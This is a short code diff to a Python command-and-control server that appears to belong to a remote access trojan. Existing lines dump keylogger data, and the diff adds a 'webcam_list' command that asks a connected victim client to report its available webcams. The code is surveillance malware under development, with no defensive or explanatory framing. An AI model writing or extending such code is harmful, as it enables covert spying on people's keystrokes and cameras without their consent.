@@ -154,7 +154,16 @@ def handle_client(client_socket, addr):
             print(Fore.WHITE + dump_keylogger_data())
             continue
 
+        # Handle webcam_list command
+        if command == "webcam_list":
+            print(Fore.YELLOW + "[ * ] Requesting webcam list from client...")
+            client_socket.send(command.encode('utf-8'))
+            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
+            print(Fore.WHITE + "[ * ] Available Webcams:\n" + response)
+            continue
+
         client_socket.send(command.encode('utf-8'))
+
 
 def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
